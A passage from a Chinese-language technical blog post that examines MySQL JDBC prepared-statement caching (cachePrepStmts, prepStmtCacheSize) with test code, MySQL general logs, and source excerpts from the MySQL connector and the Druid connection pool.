java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="meta">@SneakyThrows</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testPreCompile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  String connectString = <span class="string">"jdbc:mysql://localhost/test?user=root&amp;password=toor&amp;useLocalSessionState=true&amp;useSSL=false&amp;useServerPrepStmts=true&amp;cachePrepStmts=true"</span>;</span><br><span class="line">  Class.forName(<span class="string">"com.mysql.jdbc.Driver"</span>)</span><br><span class="line">    .newInstance();</span><br><span class="line">  <span class="keyword">try</span> (Connection conn = DriverManager.getConnection(connectString)) &#123;</span><br><span class="line">    Stopwatch stopwatch = Stopwatch.createStarted();</span><br><span class="line">    <span class="keyword">try</span> (PreparedStatement psts = conn.prepareStatement(<span class="string">"delete from words where id = ?"</span>)) &#123;</span><br><span class="line">      psts.setInt(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">      psts.execute();</span><br><span class="line">      stopwatch.stop();</span><br><span class="line">      System.out.println(<span class="string">"stopwatch = "</span> + stopwatch.elapsed(TimeUnit.MILLISECONDS));</span><br><span class="line">      psts.setInt(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">      psts.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 上面的stmt关闭之后，再次执行</span></span><br><span class="line">    <span class="keyword">try</span> (PreparedStatement psts = conn.prepareStatement(<span class="string">"delete from words where id = ?"</span>)) &#123;</span><br><span class="line">      psts.setInt(<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">      psts.execute();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 上面的connection关闭之后，再次执行</span></span><br><span class="line">  <span class="keyword">try</span> (Connection conn = DriverManager.getConnection(connectString)) &#123;</span><br><span class="line">    <span class="keyword">try</span> (PreparedStatement psts = conn.prepareStatement(<span class="string">"delete from words where id = ?"</span>)) &#123;</span><br><span class="line">      psts.setInt(<span class="number">1</span>, <span class="number">66</span>);</span><br><span class="line">      psts.execute();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>wireshark抓包：</p><img src="/2020/05/05/cache-prep-stmts/image-20200504231854521.png"><p>mysql的general log：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">2020-05-04T15:17:32.921041Z   19 Connectroot@localhost on <span class="built_in">test</span> using TCP/IP</span><br><span class="line">2020-05-04T15:17:32.929561Z   19 Query/* mysql-connector-java-8.0.16 (Revision: 34cbc6bc61f72836e26327537a432d6db7c77de6) */SELECT  @@session.auto_increment_increment AS auto_increment_increment, @@character_set_client AS character_set_client, @@character_set_connection AS character_set_connection, @@character_set_results AS character_set_results, @@character_set_server AS character_set_server, @@collation_server AS collation_server, @@collation_connection AS collation_connection, @@init_connect AS init_connect, @@interactive_timeout AS interactive_timeout, @@license AS license, @@lower_case_table_names AS lower_case_table_names, @@max_allowed_packet AS max_allowed_packet, @@net_write_timeout AS net_write_timeout, @@performance_schema AS performance_schema, @@sql_mode AS sql_mode, @@system_time_zone AS system_time_zone, @@time_zone AS time_zone, @@transaction_isolation AS transaction_isolation, @@wait_timeout AS wait_timeout</span><br><span class="line">2020-05-04T15:17:32.949986Z   19 QuerySET character_set_results = NULL</span><br><span class="line">2020-05-04T15:17:32.983173Z   19 Preparedelete from words <span class="built_in">where</span> id = ?</span><br><span class="line">2020-05-04T15:17:32.990498Z   19 Executedelete from words <span class="built_in">where</span> id = 1</span><br><span class="line">2020-05-04T15:17:32.997115Z   19 Executedelete from words <span class="built_in">where</span> id = 10</span><br><span class="line">2020-05-04T15:17:32.997566Z   19 Reset stmt</span><br><span class="line">2020-05-04T15:17:32.997725Z   19 Executedelete from words <span class="built_in">where</span> id = 100</span><br><span class="line">2020-05-04T15:17:33.003682Z   19 Quit</span><br><span class="line">2020-05-04T15:17:33.009206Z   20 Connectroot@localhost on <span class="built_in">test</span> using TCP/IP</span><br><span class="line">2020-05-04T15:17:33.009643Z   20 Query/* mysql-connector-java-8.0.16 (Revision: 34cbc6bc61f72836e26327537a432d6db7c77de6) */SELECT  @@session.auto_increment_increment AS auto_increment_increment, @@character_set_client AS character_set_client, @@character_set_connection AS character_set_connection, @@character_set_results AS character_set_results, @@character_set_server AS character_set_server, @@collation_server AS collation_server, @@collation_connection AS collation_connection, @@init_connect AS init_connect, @@interactive_timeout AS interactive_timeout, @@license AS license, @@lower_case_table_names AS lower_case_table_names, @@max_allowed_packet AS max_allowed_packet, @@net_write_timeout AS net_write_timeout, @@performance_schema AS performance_schema, @@sql_mode AS sql_mode, @@system_time_zone AS system_time_zone, @@time_zone AS time_zone, @@transaction_isolation AS transaction_isolation, @@wait_timeout AS wait_timeout</span><br><span class="line">2020-05-04T15:17:33.010569Z   20 QuerySET character_set_results = NULL</span><br><span class="line">2020-05-04T15:17:33.011244Z   20 Preparedelete from words <span class="built_in">where</span> id = ?</span><br><span class="line">2020-05-04T15:17:33.011475Z   20 Executedelete from words <span class="built_in">where</span> id = 66</span><br><span class="line">2020-05-04T15:17:33.114892Z   20 Quit</span><br></pre></td></tr></table></figure><p>连接关闭之后，重新执行同样的sql，发现又触发了编译。</p><h3 id="缓存大小的限制"><a href="#缓存大小的限制" class="headerlink" title="缓存大小的限制"></a>缓存大小的限制</h3><p>下面两个参数，分别限制了能够缓存多少个和最大sql的长度</p><h4 id="prepStmtCacheSize"><a href="#prepStmtCacheSize" class="headerlink" title="prepStmtCacheSize"></a>prepStmtCacheSize</h4><blockquote><p><strong>prepStmtCacheSize</strong></p><p>If prepared statement caching is enabled, <strong>how many</strong> prepared statements should be cached?</p><p>Default: 25</p><p>Since version: 3.0.10</p></blockquote><h4 id="prepStmtCacheSqlLimit"><a href="#prepStmtCacheSqlLimit" class="headerlink" title="prepStmtCacheSqlLimit"></a>prepStmtCacheSqlLimit</h4><blockquote><p>If prepared statement caching is enabled, what’s the <strong>largest SQL</strong> the driver will cache the parsing for?</p><p>Default: 256</p><p>Since version: 3.0.10</p></blockquote><h2 id="druid-连接池下使用"><a href="#druid-连接池下使用" class="headerlink" title="druid 连接池下使用"></a>druid 连接池下使用</h2><p>测试代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="meta">@SneakyThrows</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testPreCompile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String connectString = <span class="string">"jdbc:mysql://localhost/test?user=root&amp;password=toor&amp;useLocalSessionState=true&amp;useSSL=false&amp;useServerPrepStmts=true&amp;cachePrepStmts=true"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> DruidDataSource druidDataSource = <span class="keyword">new</span> DruidDataSource();</span><br><span class="line">        druidDataSource.setUrl(connectString);</span><br><span class="line">        druidDataSource.setUsername(<span class="string">"root"</span>);</span><br><span class="line">        druidDataSource.setPassword(<span class="string">"toor"</span>);</span><br><span class="line">        druidDataSource.setFilters(<span class="string">"slf4j"</span>);</span><br><span class="line">        <span class="comment">//        druidDataSource.setTestOnBorrow(true);</span></span><br><span class="line">        <span class="comment">//        druidDataSource.setTestOnReturn(true);</span></span><br><span class="line">        <span class="comment">//        druidDataSource.setTestWhileIdle(true);</span></span><br><span class="line">        druidDataSource.setMaxActive(<span class="number">1</span>);</span><br><span class="line">        druidDataSource.setInitialSize(<span class="number">1</span>);</span><br><span class="line">        druidDataSource.setTimeBetweenLogStatsMillis(<span class="number">900</span>);</span><br><span class="line">        <span class="keyword">try</span> (Connection conn = druidDataSource.getConnection()) &#123;</span><br><span class="line">            Stopwatch stopwatch = Stopwatch.createStarted();</span><br><span class="line">            <span class="keyword">try</span> (PreparedStatement psts = conn.prepareStatement(<span class="string">"delete from words where id = ?"</span>)) &#123;</span><br><span class="line">                psts.setInt(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">                psts.execute();</span><br><span class="line">                stopwatch.stop();</span><br><span class="line">                System.out.println(<span class="string">"stopwatch = "</span> + stopwatch.elapsed(TimeUnit.MILLISECONDS));</span><br><span class="line">                psts.setInt(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">                psts.execute();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 上面的stmt关闭之后，再次执行</span></span><br><span class="line">            <span class="keyword">try</span> (PreparedStatement psts = conn.prepareStatement(<span class="string">"delete from words where id = ?"</span>)) &#123;</span><br><span class="line">                psts.setInt(<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">                psts.execute();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 上面的connection关闭之后，再次执行</span></span><br><span class="line">        <span class="keyword">try</span> (Connection conn = druidDataSource.getConnection()) &#123;</span><br><span class="line">            <span class="keyword">try</span> (PreparedStatement psts = conn.prepareStatement(<span class="string">"delete from words where id = ?"</span>)) &#123;</span><br><span class="line">                psts.setInt(<span class="number">1</span>, <span class="number">66</span>);</span><br><span class="line">                psts.execute();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>只有一个连接的druid连接池，连接关闭连接时其实是归还到池子中，所以第二次拿连接，<strong>拿到的还是同一个</strong>；所以没有触发第二次编译。</p><p>wireshark抓包：</p><img src="/2020/05/05/cache-prep-stmts/image-20200504232259775.png"><p>mysql general log：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2020-05-04T15:21:34.187732Z   21 Connectroot@localhost on <span class="built_in">test</span> using TCP/IP</span><br><span class="line">2020-05-04T15:21:34.202166Z   21 Query/* mysql-connector-java-8.0.16 (Revision: 34cbc6bc61f72836e26327537a432d6db7c77de6) */SELECT  @@session.auto_increment_increment AS auto_increment_increment, @@character_set_client AS character_set_client, @@character_set_connection AS character_set_connection, @@character_set_results AS character_set_results, @@character_set_server AS character_set_server, @@collation_server AS collation_server, @@collation_connection AS collation_connection, @@init_connect AS init_connect, @@interactive_timeout AS interactive_timeout, @@license AS license, @@lower_case_table_names AS lower_case_table_names, @@max_allowed_packet AS max_allowed_packet, @@net_write_timeout AS net_write_timeout, @@performance_schema AS performance_schema, @@sql_mode AS sql_mode, @@system_time_zone AS system_time_zone, @@time_zone AS time_zone, @@transaction_isolation AS transaction_isolation, @@wait_timeout AS wait_timeout</span><br><span class="line">2020-05-04T15:21:34.240492Z   21 QuerySET character_set_results = NULL</span><br><span class="line">2020-05-04T15:21:34.316483Z   21 Preparedelete from words <span class="built_in">where</span> id = ?</span><br><span class="line">2020-05-04T15:21:34.333444Z   21 Executedelete from words <span class="built_in">where</span> id = 1</span><br><span class="line">2020-05-04T15:21:34.344075Z   21 Executedelete from words <span class="built_in">where</span> id = 10</span><br><span class="line">2020-05-04T15:21:34.351728Z   21 Reset stmt</span><br><span class="line">2020-05-04T15:21:34.352101Z   21 Executedelete from words <span class="built_in">where</span> id = 100</span><br><span class="line">2020-05-04T15:21:34.356117Z   21 Reset stmt</span><br><span class="line">2020-05-04T15:21:34.356407Z   21 Executedelete from words <span class="built_in">where</span> id = 66</span><br></pre></td></tr></table></figure><h2 id="翻翻源码"><a href="#翻翻源码" class="headerlink" title="翻翻源码"></a>翻翻源码</h2><h3 id="jdbc-conenctor"><a href="#jdbc-conenctor" class="headerlink" title="jdbc conenctor"></a>jdbc conenctor</h3><img src="/2020/05/05/cache-prep-stmts/image-20200505000534357.png"><p>prepare的时候，会先从缓存中取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.mysql.cj.jdbc.ConnectionImpl#prepareStatement(java.lang.String, int, int)</span></span><br><span class="line"> <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> java.sql.<span class="function">PreparedStatement <span class="title">prepareStatement</span><span class="params">(String sql, <span class="keyword">int</span> resultSetType, <span class="keyword">int</span> resultSetConcurrency)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (getConnectionMutex()) &#123;</span><br><span class="line">            checkClosed();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// <span class="doctag">FIXME:</span> Create warnings if can't create results of the given type or concurrency</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            ClientPreparedStatement pStmt = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">boolean</span> canServerPrepare = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">            String nativeSql = <span class="keyword">this</span>.processEscapeCodesForPrepStmts.getValue() ? nativeSQL(sql) : sql;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.useServerPrepStmts.getValue() &amp;&amp; <span class="keyword">this</span>.emulateUnsupportedPstmts.getValue()) &#123;</span><br><span class="line">                canServerPrepare = canHandleAsServerPreparedStatement(nativeSql);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.useServerPrepStmts.getValue() &amp;&amp; canServerPrepare) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.cachePrepStmts.getValue()) &#123;</span><br><span class="line">                    <span class="keyword">synchronized</span> (<span class="keyword">this</span>.serverSideStatementCache) &#123;</span><br><span class="line">                      <span class="comment">// 从cache中取出来</span></span><br><span class="line">                        pStmt = <span class="keyword">this</span>.serverSideStatementCache.remove(<span class="keyword">new</span> CompoundCacheKey(<span class="keyword">this</span>.database, sql));</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (pStmt != <span class="keyword">null</span>) &#123;</span><br><span class="line">                          <span class="comment">// 强转为ServerPreparedStatement，清理参数，直接返回</span></span><br><span class="line">                            ((com.mysql.cj.jdbc.ServerPreparedStatement) pStmt).setClosed(<span class="keyword">false</span>);</span><br><span class="line">                            pStmt.clearParameters();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (pStmt == <span class="keyword">null</span>) &#123;</span><br><span class="line">                          <span class="comment">// 创建新的ServerPreparedStatement</span></span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                pStmt = ServerPreparedStatement.getInstance(getMultiHostSafeProxy(), nativeSql, <span class="keyword">this</span>.database, resultSetType,</span><br><span class="line">                                        resultSetConcurrency);</span><br><span class="line">                                <span class="keyword">if</span> (sql.length() &lt; <span class="keyword">this</span>.prepStmtCacheSqlLimit.getValue()) &#123;</span><br><span class="line">                                    ((com.mysql.cj.jdbc.ServerPreparedStatement) pStmt).isCached = <span class="keyword">true</span>;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                pStmt.setResultSetType(resultSetType);</span><br><span class="line">                                pStmt.setResultSetConcurrency(resultSetConcurrency);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (SQLException sqlEx) &#123;</span><br><span class="line">                                <span class="comment">// Punt, if necessary</span></span><br><span class="line">                                <span class="keyword">if</span> (<span class="keyword">this</span>.emulateUnsupportedPstmts.getValue()) &#123;</span><br><span class="line">                                    pStmt = (ClientPreparedStatement) clientPrepareStatement(nativeSql, resultSetType, resultSetConcurrency, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">                                    <span class="keyword">if</span> (sql.length() &lt; <span class="keyword">this</span>.prepStmtCacheSqlLimit.getValue()) &#123;</span><br><span class="line">                                        <span class="keyword">this</span>.serverSideStatementCheckCache.put(sql, Boolean.FALSE);</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="keyword">throw</span> sqlEx;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="comment">// only canServerPrepare</span></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        pStmt = ServerPreparedStatement.getInstance(getMultiHostSafeProxy(), nativeSql, <span class="keyword">this</span>.database, resultSetType, resultSetConcurrency);</span><br><span class="line"></span><br><span class="line">                        pStmt.setResultSetType(resultSetType);</span><br><span class="line">                        pStmt.setResultSetConcurrency(resultSetConcurrency);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (SQLException sqlEx) &#123;</span><br><span class="line">                        <span class="comment">// Punt, if necessary</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.emulateUnsupportedPstmts.getValue()) &#123;</span><br><span class="line">                            pStmt = (ClientPreparedStatement) clientPrepareStatement(nativeSql, resultSetType, resultSetConcurrency, <span class="keyword">false</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">throw</span> sqlEx;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">// 正常流程</span></span><br><span class="line">                pStmt = (ClientPreparedStatement) clientPrepareStatement(nativeSql, resultSetType, resultSetConcurrency, <span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> pStmt;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>ServerPreparedStatement</code>的继承关系</p><img src="/2020/05/05/cache-prep-stmts/image-20200505001544675.png"><p>statement关闭时会重新放入缓存：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.mysql.cj.jdbc.ServerPreparedStatement#close</span></span><br><span class="line"> <span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">  JdbcConnection locallyScopedConn = <span class="keyword">this</span>.connection;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (locallyScopedConn == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>; <span class="comment">// already closed</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">synchronized</span> (locallyScopedConn.getConnectionMutex()) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isCached &amp;&amp; isPoolable() &amp;&amp; !<span class="keyword">this</span>.isClosed) &#123;</span><br><span class="line">      clearParameters();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">this</span>.isClosed = <span class="keyword">true</span>;</span><br><span class="line"><span class="comment">// 重新缓存起来</span></span><br><span class="line">      <span class="keyword">this</span>.connection.recachePreparedStatement(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.isClosed = <span class="keyword">false</span>;</span><br><span class="line">    realClose(<span class="keyword">true</span>, <span class="keyword">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// com.mysql.cj.jdbc.ConnectionImpl#recachePreparedStatement</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">recachePreparedStatement</span><span class="params">(JdbcPreparedStatement pstmt)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (getConnectionMutex()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.cachePrepStmts.getValue() &amp;&amp; pstmt.isPoolable()) &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (<span class="keyword">this</span>.serverSideStatementCache) &#123;</span><br><span class="line">                    Object oldServerPrepStmt = <span class="keyword">this</span>.serverSideStatementCache.put(</span><br><span class="line">                            <span class="keyword">new</span> CompoundCacheKey(pstmt.getCurrentCatalog(), ((PreparedQuery&lt;?&gt;) pstmt.getQuery()).getOriginalSql()),</span><br><span class="line">                            (ServerPreparedStatement) pstmt);</span><br><span class="line">                    <span class="keyword">if</span> (oldServerPrepStmt != <span class="keyword">null</span> &amp;&amp; oldServerPrepStmt != pstmt) &#123;</span><br><span class="line">                        ((ServerPreparedStatement) oldServerPrepStmt).isCached = <span class="keyword">false</span>;</span><br><span class="line">                        ((ServerPreparedStatement) oldServerPrepStmt).setClosed(<span class="keyword">false</span>);</span><br><span class="line">                        ((ServerPreparedStatement) oldServerPrepStmt).realClose(<span class="keyword">true</span>, <span class="keyword">true</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="druid"><a href="#druid" class="headerlink" title="druid"></a>druid</h3><p>druid的配置说明中，有如下的介绍，也有了一个更短的名字<strong>PSCache</strong>：</p><table><thead><tr><th>配置</th><th>缺省值</th><th>说明</th></tr></thead><tbody><tr><td>poolPreparedStatements</td><td>false</td><td>是否缓存preparedStatement，也就是<strong>PSCache</strong>。PSCache对支持游标的数据库性能提升巨大，比如说oracle。在mysql下建议关闭。</td></tr><tr><td>maxPoolPreparedStatementPerConnectionSize</td><td>-1</td><td>要启用PSCache，必须配置大于0，当大于0时，poolPreparedStatements自动触发修改为true。在Druid中，不会存在Oracle下PSCache占用内存过多的问题，可以把这个数值配置大一些，比如说100</td></tr></tbody></table><p>看下相关的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.alibaba.druid.pool.DruidPooledConnection#closePoolableStatement</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">closePoolableStatement</span><span class="params">(DruidPooledPreparedStatement stmt)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">  PreparedStatement rawStatement = stmt.getRawPreparedStatement();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (holder == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stmt.isPooled()) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      rawStatement.clearParameters();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException ex) &#123;</span><br><span class="line">      <span class="keyword">this</span>.handleException(ex, <span class="keyword">null</span>);</span><br><span class="line">      <span class="keyword">if</span> (rawStatement.getConnection().isClosed()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      LOG.error(<span class="string">"clear parameter error"</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  PreparedStatementHolder stmtHolder = stmt.getPreparedStatementHolder();</span><br><span class="line">  stmtHolder.decrementInUseCount();</span><br><span class="line">  <span class="comment">// holder.isPoolPreparedStatements 